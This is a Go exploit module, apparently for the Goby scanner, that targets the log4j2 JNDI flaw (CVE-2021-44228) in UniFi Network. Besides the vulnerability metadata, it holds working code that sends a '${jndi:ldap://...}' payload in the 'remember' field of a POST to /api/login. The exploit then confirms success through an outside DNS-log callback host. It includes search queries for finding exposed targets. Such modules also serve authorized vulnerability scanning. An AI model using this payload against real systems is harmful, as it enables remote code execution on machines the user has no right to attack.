package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "UniFi Network log4j2 RCE (CVE-2021-44228)",
    "Description": "<p>UniFi Network is a centralized management platform for UniFi devices and applications.</p><p>The UniFi Network platform has a log42 remote command execution vulnerability. Attackers can use this feature to construct special data request packets through this vulnerability, and ultimately trigger remote code execution.</p>",
    "Impact": "UniFi Network log4j2 RCE (CVE-2021-44228)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.ui.com.cn/\">https://help.ui.com.cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "UniFi Network",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "UniFi Network log4j2 命令执行漏洞（CVE-2021-44228）",
            "Description": "<p>UniFi Network是 UniFi 设备和应用程序的集中管理平台。</p><p>UniFi Network 平台存在log42远程命令执行漏洞。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</p>",
            "Impact": "<p>UniFi Network 平台存在log42远程命令执行漏洞。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://help.ui.com.cn/\">https://help.ui.com.cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "UniFi Network",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "UniFi Network log4j2 RCE (CVE-2021-44228)",
            "Description": "<p>UniFi Network is a centralized management platform for UniFi devices and applications.</p><p>The UniFi Network platform has a log42 remote command execution vulnerability. Attackers can use this feature to construct special data request packets through this vulnerability, and ultimately trigger remote code execution.</p>",
            "Impact": "UniFi Network log4j2 RCE (CVE-2021-44228)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.ui.com.cn/\">https://help.ui.com.cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "UniFi Network",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"UniFi Network\" || body=\"UniFi Network\"",
    "GobyQuery": "title=\"UniFi Network\" || body=\"UniFi Network\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://help.ui.com.cn/",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "${jndi:ldap://${hostName}.xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10246"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri2 := "/api/login"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/json; charset=utf-8")
			cfg2.Data = fmt.Sprintf(`{"username":"1234","password":"1234","remember":"%s","strict":true}`, cmd)
			httpclient.DoHttpRequest(u, cfg2)
			return godclient.PullExists(checkStr, time.Second*10)
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri2 := "/api/login"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/json; charset=utf-8")
			cfg2.Data = fmt.Sprintf(`{"username":"1234","password":"1234","remember":"%s","strict":true}`, cmd)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			expResult.Output = "see your dnslog"
			expResult.Success = true
			return expResult
		},
	))
}
